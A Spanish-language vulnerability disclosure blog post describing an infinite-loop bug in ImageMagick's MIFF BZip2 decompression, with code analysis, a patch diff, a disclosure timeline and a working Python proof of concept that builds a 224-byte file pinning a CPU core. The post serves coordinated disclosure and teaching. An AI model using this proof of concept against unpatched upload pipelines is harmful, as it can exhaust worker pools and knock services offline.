# Mi primer CVE: un MIFF de 224 bytes que clava ImageMagick al 100% de CPU

Este es mi primer CVE. La versión corta: el lector de MIFF de ImageMagick tiene un bucle infinito en su rama de descompresión BZip2. Un archivo de 224 bytes alcanza para clavar un worker al 100% de CPU hasta que algo externo lo mate. Silencioso. Pre-auth. Un solo request.

- **GHSA:** [GHSA-7gg8-qqx7-92g5](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-7gg8-qqx7-92g5)
- **CVE:** CVE-2026-46522
- **Severidad:** 7.5 Alta (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
- **Parcheado en:** ImageMagick 7.1.2-23 y 6.9.13-48
- **Clase:** CWE-835 (Loop with Unreachable Exit Condition) + CWE-400

---

## Cómo llegué acá

La semana pasada, el equipo de ImageMagick parcheó [GHSA-jcqp-6r6f-3mfx](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-jcqp-6r6f-3mfx), un bug del lado de escritura en la rama LZMA de `coders/miff.c`. El parche tocó dos cosas:

1. Un `LZMAMaxExtent` faltante en un cálculo de tamaño de buffer.
2. Un flag de `status` seteado a `MagickTrue` en una rama de error que debería haberlo dejado en false.

Estaba leyendo el parche y me dio curiosidad. Los dos bugs vivían en `WriteMIFFImage`. La ruta de lectura, `ReadMIFFImage`, tiene exactamente la misma estructura: tres ramas de descompresión (BZip, LZMA, Zip), cada una con su propio prefijo de largo y bucle de descompresión. Si dos bugs se le escaparon al review en el lado de escritura, ¿qué pasaba en el lado de lectura?

Anoté una hipótesis:

> **H001:** `ReadMIFFImage` tiene bugs adyacentes al parche reciente de `WriteMIFFImage`. Específicamente: (a) el mismo problema de MaxExtent faltante en el buffer, y (b) el mismo error de dirección del flag de status.

Las dos predicciones resultaron equivocadas. La ruta de lectura ya tenía `MagickMax(BZipMaxExtent, LZMAMaxExtent, ZipMaxExtent)` cubriendo los tres compresores. Y los `status = MagickTrue` en el loop de lectura son inicializaciones intencionales, no bugs de error path.

Pero seguí leyendo la misma región del código, y ahí lo encontré.

## El bug

`coders/miff.c`, línea ~1484, rama BZip del switch de descompresión por fila:

```c
case BZipCompression:
{
  bzip_info.next_out = (char *) pixels;
  bzip_info.avail_out = (unsigned int) (packet_size*image->columns);
  do
  {
    int code;
    if (bzip_info.avail_in == 0)
    {
      bzip_info.next_in = (char *) compress_pixels;
      length = (size_t) BZipMaxExtent(packet_size*image->columns);
      if (version != 0.0)
        length = (size_t) ReadBlobMSBLong(image);   /* controlado por el atacante */
      if (length <= compress_extent)
        bzip_info.avail_in = (unsigned int) ReadBlob(image,length,
          (unsigned char *) bzip_info.next_in);
      if ((length > compress_extent) ||
          ((size_t) bzip_info.avail_in != length))
      {
        (void) BZ2_bzDecompressEnd(&bzip_info);
        ThrowMIFFException(CorruptImageError,"UnableToReadImageData");
      }
    }
    code = BZ2_bzDecompress(&bzip_info);
    if ((code != BZ_OK) && (code != BZ_STREAM_END))
    {
      status = MagickFalse;
      break;
    }
    if (code == BZ_STREAM_END)
      break;
  } while (bzip_info.avail_out != 0);
  ...
}
```

El campo `length` es un entero big-endian de 4 bytes leído directamente del archivo, totalmente controlado por el atacante. Si lo seteás a cero, mirá qué pasa:

1. `length = ReadBlobMSBLong(image) = 0`.
2. `length <= compress_extent` es true → `ReadBlob(image, 0, ...)` devuelve 0 instantáneamente. `bzip_info.avail_in` queda en 0.
3. El trap check evalúa `(0 > compress_extent) || (0 != 0)`. Ambos false. **Sin excepción.**
4. Se llama a `BZ2_bzDecompress` con `avail_in = 0`. Por el contrato de libbz2, esto devuelve `BZ_OK` silenciosamente. La librería está diciendo "pasame más datos, no hice progreso".
5. El loop de IM chequea `(code != BZ_OK) && (code != BZ_STREAM_END)`. `BZ_OK` no es fin de stream ni un error, así que el loop sigue.
6. `avail_out` no cambió (no se produjo output), así que la condición `while (avail_out != 0)` se mantiene true.
7. Próxima iteración: `avail_in == 0` otra vez. Se leen más prefijos de largo cero, o `ReadBlobMSBLong` devuelve 0 después de EOF. De cualquier forma, `length` queda en 0 para siempre.

Bucle infinito. Apretado. Sin crecimiento de memoria, sin líneas en log, solo un core de CPU clavado.

## ¿Por qué solo BZip2?

El mismo patrón existe en las ramas LZMA y Zip unos cientos de líneas más abajo. Las dos *deberían* ser vulnerables a primera vista, pero no lo son, y la diferencia es interesante.

**Rama LZMA** (~línea 1525):

```c
if (code != LZMA_OK) { status = MagickFalse; break; }
```

`lzma_code(stream, LZMA_RUN)` con `avail_in = 0` devuelve `LZMA_BUF_ERROR`. No es `LZMA_OK`. El loop sale.

**Rama Zip** (~línea 1565):

```c
if ((code != Z_OK) && (code != Z_STREAM_END)) { status = MagickFalse; break; }
```

`inflate(stream, Z_SYNC_FLUSH)` con `avail_in = 0` devuelve `Z_BUF_ERROR`. No es `Z_OK`, no es `Z_STREAM_END`. El loop sale.

**BZip2** es la única de las tres librerías que **silenciosamente** devuelve su código de éxito en input vacío. Por el contrato de la API de libbz2 esto es comportamiento documentado: `BZ2_bzDecompress` devolviendo `BZ_OK` sin progreso es una señal legítima de "dame más". Es responsabilidad del caller no llamarla en un loop con input vacío.

El caller de IM no conoce esa sutileza. Trata `BZ_OK` como "todo bien, sigamos".

Entonces: **una diferencia de contrato entre tres librerías en loops por lo demás idénticos se convierte en un bug de seguridad en uno de ellos.** Vale archivarlo bajo "taxonomía interesante".

## La PoC, 224 bytes

```python
header = (
    b"id=ImageMagick version=1.0\n"
    b"class=DirectClass colors=0 alpha-trait=Undefined\n"
    b"number-channels=3 number-meta-channels=0 channel-mask=0x0000000000000007\n"
    b"columns=1 rows=1 depth=8\n"
    b"colorspace=sRGB compression=BZip quality=75\n"
    b"\x0c\n"               # terminador form feed + el byte que consume ReadBlobByte
)
body = b"\x00\x00\x00\x00"  # largo big-endian de 4 bytes = 0
open("/tmp/poc.miff", "wb").write(header + body)
```

Trigger:

```text
$ /usr/bin/time -f 'wall=%es user=%Us cpu=%P exit=%x' \
    timeout 5 magick identify /tmp/poc.miff

Command exited with non-zero status 124
wall=5.00s user=5.00s cpu=100% exit=124
```

El proceso nunca termina por sí solo. El escalado es lineal con el timeout:

```text
T=1s  → wall=1.00s   user=1.00s   cpu=99%
T=3s  → wall=3.00s   user=3.00s   cpu=100%
T=5s  → wall=5.00s   user=5.00s   cpu=99%
T=10s → wall=10.01s  user=10.01s  cpu=99%
```

RSS se mantiene por debajo de 10 MB. Nada en stdout o stderr. El worker no está crasheando, está perdido, ocupado dando vueltas.

## El parche

Un solo chequeo faltante. Rechazar `length == 0` después del trap existente, antes de llamar a libbz2:

```diff
--- a/coders/miff.c
+++ b/coders/miff.c
@@ -1497,11 +1497,16 @@ static Image *ReadMIFFImage(const ImageInfo *image_info,
            if ((length > compress_extent) ||
                ((size_t) bzip_info.avail_in != length))
              {
                (void) BZ2_bzDecompressEnd(&bzip_info);
                ThrowMIFFException(CorruptImageError,
                  "UnableToReadImageData");
              }
+           if (length == 0)
+             {
+               (void) BZ2_bzDecompressEnd(&bzip_info);
+               ThrowMIFFException(CorruptImageError,"UnexpectedEndOfFile");
+             }
          }
        code = BZ2_bzDecompress(&bzip_info);
```

Recomendé agregar el mismo chequeo defensivo a las ramas LZMA y Zip aunque esas librerías actualmente salgan solas. La consistencia reduce sorpresas si una futura versión de la librería cambia el contrato.

## Impacto en el mundo real

MIFF es el formato nativo de ImageMagick y se autodetecta por dos canales:

1. **Nombre de archivo**: extensiones `.miff`, `.mif`.
2. **Magic bytes**: cualquier archivo cuyos primeros bytes sean `id=ImageMagick` se parsea como MIFF, **sin importar el nombre o el MIME**.

El segundo canal es el peligroso. Los pipelines que whitelisteán por extensión (`.jpg`, `.png`, `.gif`) **igual dejan pasar contenido MIFF** si dejan que el detector de magic bytes decida. Que es lo que hacen `magick`, `convert` e `identify` por default.

Pipelines concretamente afectados:

- Uploaders de CMS (WordPress, Drupal, Ghost, etc.)
- Servicios de fotos de perfil
- Manejadores de imágenes de e-commerce
- Escáneres de adjuntos de email
- Thumbnailers serverless
- Uploaders de Ruby (Carrierwave, Dragonfly, Active Storage)
- Pipelines de .NET usando Magick.NET
- Cualquier cosa que corra `identify` o `convert` sobre data del usuario

**Perfil de ataque**:

- Pre-auth
- 1 request
- 224 bytes
- Sin crecimiento de memoria → los OOM killers no lo agarran
- Sin output en logs → el SOC no lo nota

Lo único que libera al worker es un timeout de request o un SIGKILL externo. Cuando el timeout dispara, el worker vuelve. Repetí el request → otro worker se quema. Saturá el pool → el servicio deja de aceptar requests nuevos.

## Cronología de divulgación

| Fecha        | Evento                                                          |
|--------------|-----------------------------------------------------------------|
| 2026-05-13   | Encontrado y verificado en 7.1.2-3 stock y master `188fcf5`     |
| 2026-05-13   | Reportado vía GitHub Security Advisory                          |
| 2026-05-17   | Parche publicado en 7.1.2-23 y 6.9.13-48                        |
| 2026-05-17   | Advisory público: GHSA-7gg8-qqx7-92g5 / CVE-2026-46522          |
| 2026-05-17   | Este post                                                       |

Triage y respuesta rápida del equipo de ImageMagick. De reporte a advisory público en cuatro días.

## Reflexiones del primer CVE

El enfoque basado en hipótesis es lo que hizo funcionar este. No estaba fuzzeando, estaba leyendo código. Tres patrones que me llevo:

1. **Los parches recientes son inteligencia.** Donde un proyecto acaba de arreglar algo, leé el parche con atención y preguntate: *¿la misma forma está presente en otro lado?* `WriteMIFFImage` → `ReadMIFFImage` es el espejo obvio.
2. **El código adyacente es riesgo adyacente.** No encontré el bug original de tamaño LZMA en el lado de lectura. Encontré un bug distinto en la misma región mientras lo buscaba. Resultado negativo para la hipótesis, resultado positivo para la investigación.
3. **El contrato de la librería es parte del threat model.** Que `BZ2_bzDecompress` haga "lo correcto" según el contrato de libbz2 es lo que hizo este loop infinito. El bug está en IM, pero la superficie del trigger solo existe por un comportamiento de libbz2 que IM no esperaba.

Gracias a los maintainers de ImageMagick por el triage rápido. Primero de (espero) muchos.

, Jose

## Links

- Advisory: [GHSA-7gg8-qqx7-92g5](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-7gg8-qqx7-92g5)
- CVE: CVE-2026-46522
- ImageMagick: https://github.com/ImageMagick/ImageMagick
- Contrato de la API de libbz2 sobre `BZ2_bzDecompress`: https://sourceware.org/bzip2/manual/manual.html#bzdecompress
- CWE-835: https://cwe.mitre.org/data/definitions/835.html
- CWE-400: https://cwe.mitre.org/data/definitions/400.html
